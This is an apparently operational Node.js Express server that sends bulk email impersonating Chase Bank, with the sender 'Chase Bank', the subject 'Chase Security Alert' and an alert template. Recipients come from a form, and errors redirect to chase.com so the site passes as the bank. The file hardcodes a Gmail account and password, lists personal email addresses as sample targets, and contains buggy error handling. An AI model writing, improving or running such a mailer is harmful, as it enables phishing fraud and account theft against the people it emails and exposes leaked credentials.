const express = require('express');
const http = require('http');
const debug = require('debug');
const router = express.Router();
const logger = require('morgan');


const path = require('path');
const favicon = require('serve-favicon');
const bodyParser = require('body-parser');
const nodemailer = require("nodemailer");
const fs = require('fs');

const hbs = require('hbs');

const hb2 = require('nodemailer-express-handlebars');


let app = express();

app.use(logger('dev'));

app.use(bodyParser.urlencoded({
    extended: true
}));
app.use(bodyParser.json());


let vm = {
    title: 'Mail Me',
    layout: 'layout'
};

let mailer = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'chasebankingcustomercare@gmail.com',
        pass: 'Mummy123'
    },
    logger: false,
    debug: false // include SMTP traffic in the logs
});

mailer.use('compile', hb2 ({
    viewPath: 'views/email',
    extName: '.hbs'
}));

//_yesssh5\Safety\Chase\n\1eb932e5745c485929f49dbefcebbb33
/* GET home page. */
app.get('/', (req, res, next) => {
    res.render('pages/index', vm);
});

app.post('/', (req, res, next) => {
    let rec = req.body.rec;
    // let rec2 = "olumbex@gmail.com, vince.rex@yahoo.com";

    let result;
    result = rec.split(/[ ,]+/);
    // result = rec2.split(/[ ,]+/);


    let somePromise = new Promise((resolve, reject)=>{

        for (let i = 0, len = result.length; i < len; i++) {
            console.log(result[i]);
            mailer.sendMail({
                from: 'Chase Bank <chasebankingcustomercare@gmail.com>',
                to: result[i],
                subject: 'Chase Security Alert',
                template: 'alert',
                context: {},
            }, (err, response) => {
                if (err){
                    console.log('Error occurred');
                    console.log(`Error: ${error.message}`);
                }

                console.log('Message sent successfully!');
                console.log(nodemailer.getTestMessageUrl(info));
                console.log(`Email sent:   ${info.response}`);
            });
        }
        resolve('all went well');
        reject('Things went Bad');
    });

    somePromise.then(()=>{
        res.redirect('/');
    },(errorMessage)=>{
        console.log(`ERROR: ${errorMessage}`)
    });

});


// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'hbs');


// uncomment after placing your favicon in /public
app.use(favicon(path.join(__dirname, 'public', 'favicon.ico')));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));


// app.use(flash()); // use connect-flash for flash messages stored in session


//handlebars custom helper
hbs.registerHelper('if_eq', function(a, b, opts) {
    if (a === b) {
        return opts.fn(this);
    } else {
        return opts.inverse(this);
    }
});


// catch 404 and forward to error handler
app.use(function(req, res, next) {
    let err = new Error('Not Found');
    err.status = 404;
    next(err);
    // res.redirect('https://chase.com')
});

// error handlers

// development error handler
// will print stacktrace
if (app.get('env') === 'development') {
    // res.redirect('https://chase.com');

    app.use(function(err, req, res, next) {
            // res.redirect('https://chase.com');

        res.status(err.status || 500);
        res.render('error', {
            message: err.message,
            error: err
        });
    });
}

// production error handler
// no stacktraces leaked to user
app.use(function(err, req, res, next) {
    res.redirect('https://chase.com') ;

    // res.status(err.status || 500);
    // res.render('error', {
    //     message: err.message,
    //     error: {}
    // });
});

// var port = normalizePort(process.env.PORT || '5000');
const port = normalizePort(process.env.PORT || '70');
app.set('port', port);
    // .listening(console.log('listening on port 69'));

/**
 * Create HTTP server.
 */

let server = http.createServer(app);
// let server = http.createServer(app);

/**
 * Listen on provided port, on all network interfaces.
 */

server.listen(port, () =>{
    // let host = server.address().address;
    let port = server.address().port;
    console.log(`App is listening on Port : ${port}`);
});
server.on('error', onError);
server.on('listening', onListening);

/**
 * Normalize a port into a number, string, or false.
 */

function normalizePort(val) {
    let port = parseInt(val, 10);

    if (isNaN(port)) {
        // named pipe
        return val;
    }

    if (port >= 0) {
        // port number
        return port;
    }

    return false;
}

/**
 * Event listener for HTTP server "error" event.
 */

function onError(error) {
    if (error.syscall !== 'listen') {
        throw error;
    }

    let bind = typeof port === 'string'
        ? 'Pipe ' + port
        : 'Port ' + port;

    // handle specific listen errors with friendly messages
    switch (error.code) {
        case 'EACCES':
            console.error(bind + ' requires elevated privileges');
            process.exit(1);
            break;
        case 'EADDRINUSE':
            console.error(bind + ' is already in use');
            process.exit(1);
            break;
        default:
            throw error;
    }
}

/**
 * Event listener for HTTP server "listening" event.
 */

function onListening() {
    let addr = server.address();
    let bind = typeof addr === 'string'
        ? 'pipe ' + addr
        : 'port ' + addr.port;
    debug('Listening on ' + bind);
}

module.exports = app;
